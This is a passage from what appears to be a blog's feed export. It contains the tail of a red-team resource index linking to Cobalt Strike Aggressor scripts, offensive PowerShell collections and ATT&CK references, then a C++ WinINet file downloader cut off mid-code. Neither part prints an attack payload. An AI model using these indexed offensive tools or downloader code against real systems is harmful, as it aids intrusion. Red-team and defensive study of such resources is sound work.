within lab environments. <a href="https://github.com/SpiderLabs/sheepl" target="_blank" rel="noopener">https://github.com/SpiderLabs/sheepl</a></li></ul><h3 id="Scripts"><a href="#Scripts" class="headerlink" title="Scripts"></a>Scripts</h3><ul><li><p><strong>Aggressor Scripts</strong> is a scripting language for red team operations and adversary simulations inspired by scriptable IRC clients and bots.</p><ul><li><a href="https://github.com/invokethreatguy/CSASC" target="_blank" rel="noopener">https://github.com/invokethreatguy/CSASC</a></li><li><a href="https://github.com/secgroundzero/CS-Aggressor-Scripts" target="_blank" rel="noopener">https://github.com/secgroundzero/CS-Aggressor-Scripts</a></li><li><a href="https://github.com/Und3rf10w/Aggressor-scripts" target="_blank" rel="noopener">https://github.com/Und3rf10w/Aggressor-scripts</a></li><li><a href="https://github.com/harleyQu1nn/AggressorScripts" target="_blank" rel="noopener">https://github.com/harleyQu1nn/AggressorScripts</a></li><li><a href="https://github.com/rasta-mouse/Aggressor-Script" target="_blank" rel="noopener">https://github.com/rasta-mouse/Aggressor-Script</a></li><li><a href="https://github.com/RhinoSecurityLabs/Aggressor-Scripts" target="_blank" rel="noopener">https://github.com/RhinoSecurityLabs/Aggressor-Scripts</a></li><li><a href="https://github.com/bluscreenofjeff/AggressorScripts" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/AggressorScripts</a></li><li><a href="https://github.com/001SPARTaN/aggressor_scripts" target="_blank" rel="noopener">https://github.com/001SPARTaN/aggressor_scripts</a></li><li><a href="https://github.com/360-A-Team/CobaltStrike-Toolset" target="_blank" rel="noopener">https://github.com/360-A-Team/CobaltStrike-Toolset</a></li></ul></li><li><p>A collection scripts useful for red teaming and pentesting</p><ul><li><a href="https://github.com/FuzzySecurity/PowerShell-Suite" target="_blank" rel="noopener">https://github.com/FuzzySecurity/PowerShell-Suite</a></li><li><a href="https://github.com/nettitude/Powershell" target="_blank" rel="noopener">https://github.com/nettitude/Powershell</a></li><li><a href="https://github.com/Mr-Un1k0d3r/RedTeamPowershellScripts" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/RedTeamPowershellScripts</a></li><li><a href="https://github.com/threatexpress/red-team-scripts" target="_blank" rel="noopener">https://github.com/threatexpress/red-team-scripts</a></li><li><a href="https://github.com/SadProcessor/SomeStuff" target="_blank" rel="noopener">https://github.com/SadProcessor/SomeStuff</a></li><li><a href="https://github.com/rvrsh3ll/Misc-Powershell-Scripts" target="_blank" rel="noopener">https://github.com/rvrsh3ll/Misc-Powershell-Scripts</a></li><li><a href="https://github.com/enigma0x3/Misc-PowerShell-Stuff" target="_blank" rel="noopener">https://github.com/enigma0x3/Misc-PowerShell-Stuff</a></li><li><a href="https://github.com/ChrisTruncer/PenTestScripts" target="_blank" rel="noopener">https://github.com/ChrisTruncer/PenTestScripts</a></li><li><a href="https://github.com/bluscreenofjeff/Scripts" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/Scripts</a></li><li><a href="https://github.com/xorrior/RandomPS-Scripts" target="_blank" rel="noopener">https://github.com/xorrior/RandomPS-Scripts</a></li><li><a href="https://github.com/xorrior/Random-CSharpTools" target="_blank" rel="noopener">https://github.com/xorrior/Random-CSharpTools</a></li><li><a href="https://github.com/leechristensen/Random" target="_blank" rel="noopener">https://github.com/leechristensen/Random</a></li><li><a href="https://github.com/mgeeky/Penetration-Testing-Tools/tree/master/social-engineering" target="_blank" rel="noopener">https://github.com/mgeeky/Penetration-Testing-Tools/tree/master/social-engineering</a></li></ul></li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><strong>MITREâ€™s ATT&amp;CKâ„¢</strong> is a curated knowledge base and model for cyber adversary behavior, reflecting the various phases of an adversaryâ€™s lifecycle and the platforms they are known to target. <a href="https://attack.mitre.org/wiki/Main_Page" target="_blank" rel="noopener">https://attack.mitre.org/wiki/Main_Page</a></li><li><strong>Cheat Sheets</strong> for various projects (Beacon/Cobalt Strike,PowerView, PowerUp, Empire, and PowerSploit). <a href="https://github.com/HarmJ0y/CheatSheets" target="_blank" rel="noopener">https://github.com/HarmJ0y/CheatSheets</a></li><li><strong>PRE-ATT&amp;CK</strong> Adversarial Tactics, Techniques &amp; Common Knowledge for Left-of-Exploit. <a href="https://attack.mitre.org/pre-attack/index.php/Main_Page" target="_blank" rel="noopener">https://attack.mitre.org/pre-attack/index.php/Main_Page</a></li><li><strong>Adversary OPSEC</strong> consists of the use of various technologies or 3rd party services to obfuscate, hide, or blend in with accepted network traffic or system behavior. <a href="https://attack.mitre.org/pre-attack/index.php/Adversary_OPSEC" target="_blank" rel="noopener">https://attack.mitre.org/pre-attack/index.php/Adversary_OPSEC</a></li><li><strong>Adversary Emulation Plans</strong> To showcase the practical use of ATT&amp;CK for offensive operators and defenders, MITRE created Adversary Emulation Plans. <a href="https://attack.mitre.org/wiki/Adversary_Emulation_Plans" target="_blank" rel="noopener">https://attack.mitre.org/wiki/Adversary_Emulation_Plans</a></li><li><strong>Red-Team-Infrastructure-Wiki</strong> Wiki to collect Red Team infrastructure hardening resources. <a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a></li><li><strong>Advanced Threat Tactics â€“ Course and Notes</strong> This is a course on red team operations and adversary simulations. <a href="https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes" target="_blank" rel="noopener">https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes</a></li><li><strong>Red Team Tips</strong> as posted by @vysecurity on Twitter. <a href="https://vincentyiu.co.uk/red-team-tips" target="_blank" rel="noopener">https://vincentyiu.co.uk/red-team-tips</a></li><li><strong>Awesome Red Teaming</strong> List of Awesome Red Team / Red Teaming Resources. <a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming" target="_blank" rel="noopener">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></li><li><strong>ATT&amp;CK for Enterprise Software</strong> is a generic term for custom or commercial code, operating system utilities, open-source software, or other tools used to conduct behavior modeled in ATT&amp;CK. <a href="https://attack.mitre.org/wiki/Software" target="_blank" rel="noopener">https://attack.mitre.org/wiki/Software</a></li><li><strong>Planning a Red Team exercise</strong> This document helps inform red team planning by contrasting against the very specific red team style described in Red Teams. <a href="https://github.com/magoo/redteam-plan" target="_blank" rel="noopener">https://github.com/magoo/redteam-plan</a></li><li><strong>Awesome Lockpicking</strong> a curated list of awesome guides, tools, and other resources related to the security and compromise of locks, safes, and keys. <a href="https://github.com/meitar/awesome-lockpicking" target="_blank" rel="noopener">https://github.com/meitar/awesome-lockpicking</a></li><li><strong>Awesome Threat Intelligence</strong> a curated list of awesome Threat Intelligence resources. <a href="https://github.com/hslatman/awesome-threat-intelligence" target="_blank" rel="noopener">https://github.com/hslatman/awesome-threat-intelligence</a></li><li><strong>APT Notes</strong> Need some scenario? APTnotes is a repository of publicly-available papers and blogs (sorted by year) related to malicious campaigns/activity/software that have been associated with vendor-defined APT (Advanced Persistent Threat) groups and/or tool-sets. <a href="https://github.com/aptnotes/data" target="_blank" rel="noopener">https://github.com/aptnotes/data</a></li><li><strong>TIBER-EU FRAMEWORK</strong> The European Framework for Threat Intelligence-based Ethical Red Teaming (TIBER-EU), which is the first Europe-wide framework for controlled and bespoke tests against cyber attacks in the financial market. <a href="http://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf" target="_blank" rel="noopener">http://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf</a></li><li><strong>CBEST Implementation Guide</strong> CBEST is a framework to deliver controlled, bespoke, intelligence-led cyber security tests. The tests replicate behaviours of threat actors, assessed by the UK Government and commercial intelligence providers as posing a genuine threat to systemically important financial institutions.<br><a href="https://www.crest-approved.org/wp-content/uploads/2014/07/CBEST-Implementation-Guide.pdf" target="_blank" rel="noopener">https://www.crest-approved.org/wp-content/uploads/2014/07/CBEST-Implementation-Guide.pdf</a></li><li><strong>Red Team: Adversarial Attack Simulation Exercise Guidelines for the Financial Industry in Singapore</strong> The Association of Banks in Singapore (ABS), with support from the Monetary Authority of Singapore (MAS), has developed a set of cybersecurity assessment guidelines today to strengthen the cyber resilience of the financial sector in Singapore. Known as the Adversarial Attack Simulation Exercises (AASE) Guidelines or â€œRed Teamingâ€ Guidelines, the Guidelines provide financial institutions (FIs) with best practices and guidance on planning and conducting Red Teaming exercises to enhance their security testing.<br><a href="https://abs.org.sg/docs/library/abs-red-team-adversarial-attack-simulation-exercises-guidelines-v1-06766a69f299c69658b7dff00006ed795.pdf" target="_blank" rel="noopener">https://abs.org.sg/docs/library/abs-red-team-adversarial-attack-simulation-exercises-guidelines-v1-06766a69f299c69658b7dff00006ed795.pdf</a></li></ul><h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p><a href="https://www.gnu.org/licenses/gpl-3.0" target="_blank" rel="noopener"><img src="https://img.shields.io/badge/License-GPL%20v3-blue.svg" alt="License: GPL v3"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/uploads/bBQ9aKm.png&quot; alt=&quot;alt text&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Tools" scheme="https://yaalonsong.github.io/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://yaalonsong.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>wininet_downloader_cpp</title>
    <link href="https://yaalonsong.github.io/2019/02/28/wininet_downloader_cpp.html"/>
    <id>https://yaalonsong.github.io/2019/02/28/wininet_downloader_cpp.html</id>
    <published>2019-02-28T09:49:30.396Z</published>
    <updated>2019-02-28T13:17:19.193Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>wininet.lib  cpp ä¸‹è½½</p></blockquote><a id="more"></a><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wininet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"wininet.lib"</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  DOWNHELPER_AGENTNAME         <span class="meta-string">"downloader"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  LEN_OF_BUFFER_FOR_QUERYINFO  128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  DOWNLOAD_BUF_SIZE            (10*1024)  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  MAX_DOWNLOAD_REQUEST_TIME    10  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  MAX_DOWNLOAD_BYTESIZE        (10000*1024*1024)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">BOOL _TryHttpSendRequest(LPVOID hRequest, <span class="keyword">int</span> nMaxTryTimes); </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">DownloadUrl</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> strUrl, <span class="built_in">std</span>::<span class="built_in">string</span> strFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    <span class="keyword">if</span> (strUrl == <span class="string">""</span> || strFileName == <span class="string">""</span>)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"> </span><br><span class="line">   </span><br><span class="line">    HINTERNET hInet = <span class="literal">NULL</span>; </span><br><span class="line">    HINTERNET hConnect = <span class="literal">NULL</span>; </span><br><span class="line">    HINTERNET hRequestHead = <span class="literal">NULL</span>; </span><br><span class="line">    HINTERNET hRequestGet = <span class="literal">NULL</span>; </span><br><span class="line">    HANDLE hFileWrite = <span class="literal">NULL</span>; </span><br><span class="line">    <span class="keyword">char</span>* pBuf = <span class="literal">NULL</span>; </span><br><span class="line">    DWORD dwRequestTryTimes = MAX_DOWNLOAD_REQUEST_TIME;</span><br><span class="line">    DWORD dwDownBytes = <span class="number">0</span>; </span><br><span class="line">    DWORD dwDownFileTotalBytes = <span class="number">0</span>; </span><br><span class="line">    DWORD dwWriteBytes = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">char</span> bufQueryInfo[LEN_OF_BUFFER_FOR_QUERYINFO] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line">    DWORD dwBufQueryInfoSize = <span class="keyword">sizeof</span>(bufQueryInfo);</span><br><span class="line">    DWORD dwStatusCode = <span class="number">0</span>;</span><br><span class="line">    DWORD dwContentLen = <span class="number">0</span>;</span><br><span class="line">    DWORD dwSizeDW = <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    CHAR pszHostName[INTERNET_MAX_HOST_NAME_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    CHAR pszUserName[INTERNET_MAX_USER_NAME_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    CHAR pszPassword[INTERNET_MAX_PASSWORD_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    CHAR pszURLPath[INTERNET_MAX_URL_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    CHAR szURL[INTERNET_MAX_URL_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    URL_COMPONENTSA urlComponents = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    urlComponents.dwStructSize = <span class="keyword">sizeof</span>(URL_COMPONENTSA);</span><br><span class="line">    urlComponents.lpszHostName = pszHostName;</span><br><span class="line">    urlComponents.dwHostNameLength = INTERNET_MAX_HOST_NAME_LENGTH;</span><br><span class="line">    urlComponents.lpszUserName = pszUserName;</span><br><span class="line">    urlComponents.dwUserNameLength = INTERNET_MAX_USER_NAME_LENGTH;</span><br><span class="line">    urlComponents.lpszPassword = pszPassword;</span><br><span class="line">    urlComponents.dwPasswordLength = INTERNET_MAX_PASSWORD_LENGTH;</span><br><span class="line">    urlComponents.lpszUrlPath = pszURLPath;</span><br><span class="line">    urlComponents.dwUrlPathLength = INTERNET_MAX_URL_LENGTH;</span><br><span class="line"> </span><br><span class="line">    bRet = InternetCrackUrlA(strUrl.c_str(), <span class="number">0</span>, <span class="literal">NULL</span>, &amp;urlComponents);</span><br><span class="line">    bRet = (bRet &amp;&amp; urlComponents.nScheme == INTERNET_SERVICE_HTTP);</span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    hInet = InternetOpenA(DOWNHELPER_AGENTNAME, INTERNET_OPEN_TYPE_PRECONFIG, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hInet)</span><br><span class="line">    &#123;</span><br><span class="line">        bRet = FALSE;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    hConnect = InternetConnectA(hInet, pszHostName, urlComponents.nPort, pszUserName, pszPassword, INTERNET_SERVICE_HTTP, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hConnect)</span><br><span class="line">    &#123;</span><br><span class="line">        bRet = FALSE;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (urlComponents.dwUrlPathLength !=  <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(szURL, urlComponents.lpszUrlPath);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">strcpy</span>(szURL, <span class="string">"/"</span>);</span><br><span class="line">    </span><br><span class="line">    hRequestHead = HttpOpenRequestA(hConnect, <span class="string">"HEAD"</span>, szURL, <span class="string">"HTTP/1.1"</span>, <span class="string">""</span>, <span class="literal">NULL</span>, INTERNET_FLAG_RELOAD, <span class="number">0</span>);</span><br><span class="line">    bRet = _TryHttpSendRequest(hRequestHead, dwRequestTryTimes);</span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL; </span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">    dwContentLen = <span class="number">0</span>;</span><br><span class="line">    dwSizeDW = <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">    bRet = HttpQueryInfo(hRequestHead, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_CONTENT_LENGTH, &amp;dwContentLen, &amp;dwSizeDW, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (bRet)</span><br><span class="line">    &#123;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> (dwContentLen &gt; MAX_DOWNLOAD_BYTESIZE)</span><br><span class="line">        &#123;</span><br><span class="line">            bRet = FALSE;</span><br><span class="line">            <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    hRequestGet = HttpOpenRequestA(hConnect, <span class="string">"GET"</span>, szURL, <span class="string">"HTTP/1.1"</span>, <span class="string">""</span>, <span class="literal">NULL</span>, INTERNET_FLAG_RELOAD, <span class="number">0</span>);</span><br><span class="line">    bRet = _TryHttpSendRequest(hRequestGet, dwRequestTryTimes);</span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL; </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    hFileWrite = CreateFileA(strFileName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFileWrite)</span><br><span class="line">    &#123;</span><br><span class="line">        bRet = FALSE;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    pBuf = <span class="keyword">new</span> <span class="keyword">char</span>[DOWNLOAD_BUF_SIZE]; </span><br><span class="line">    <span class="keyword">if</span> (!pBuf)</span><br><span class="line">    &#123;</span><br><span class="line">        bRet = FALSE;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    dwDownFileTotalBytes = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwDownBytes = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(pBuf, <span class="number">0</span>, DOWNLOAD_BUF_SIZE*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">        bRet = InternetReadFile(hRequestGet, pBuf, DOWNLOAD_BUF_SIZE, &amp;dwDownBytes);</span><br><span class="line">        <span class="keyword">if</span> (bRet)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (dwDownBytes &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dwDownFileTotalBytes += dwDownBytes;</span><br><span class="line">                bRet = WriteFile(hFileWrite, pBuf, dwDownBytes, &amp;dwWriteBytes, <span class="literal">NULL</span>); </span><br><span class="line">                <span class="keyword">if</span> (!bRet)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == dwDownBytes)</span><br><span class="line">            &#123;</span><br><span class="line">                bRet = TRUE;</span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line">_END_OF_DOWNLOADURL:</span><br><span class="line">    <span class="keyword">if</span> (INVALID_HANDLE_VALUE != hFileWrite)</span><br><span class="line">        CloseHandle(hFileWrite);</span><br><span class="line">    <span class="keyword">if</span> (pBuf)</span><br><span class="line">        <span class="keyword">delete</span> [] pBuf;</span><br><span class="line">    <span class="keyword">if</span> (hRequestGet)</span><br><span class="line">        InternetCloseHandle(hRequestGet);</span><br><span class="line">    <span class="keyword">if</span> (hRequestHead)</span><br><span class="line">        InternetCloseHandle(hRequestHead);</span><br><span class="line">    <span class="keyword">if</span> (hConnect)</span><br><span class="line">        InternetCloseHandle(hConnect);</span><br><span class="line">    <span class="keyword">if</span> (hInet)</span><br><span class="line">        InternetCloseHandle(hInet);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">BOOL _TryHttpSendRequest(LPVOID hRequest, <span class="keyword">int</span> nMaxTryTimes)</span><br><span class="line">&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    DWORD dwStatusCode = <span class="number">0</span>;</span><br><span class="line">    DWORD dwSizeDW = <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">    <span class="keyword">while</span> (hRequest &amp;&amp; (nMaxTryTimes-- &gt; <span class="number">0</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">       </span><br><span class="line">        bRet = HttpSendRequestA(hRequest, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!bRet)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            dwStatusCode = <span class="number">0</span>;</span><br><span class="line">            dwSizeDW = <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">            bRet = HttpQueryInfo(hRequest, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_STATUS_CODE, &amp;dwStatusCode, &amp;dwSizeDW, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (bRet)</span><br><span class="line">            &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (HTTP_STATUS_OK == dwStatusCode) </span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    bRet = FALSE;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; <span class="string">"pls input downloadurl:"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> str[<span class="number">80</span>];</span><br><span class="line"><span class="built_in">cin</span>.get(str,<span class="number">80</span>);</span><br><span class="line">    </span><br><span class="line">BOOL bR = DownloadUrl(str, <span class="string">"temp.png"</span>); </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"Downloading..."</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">if</span> (bR)</span><br><span class="line">        <span 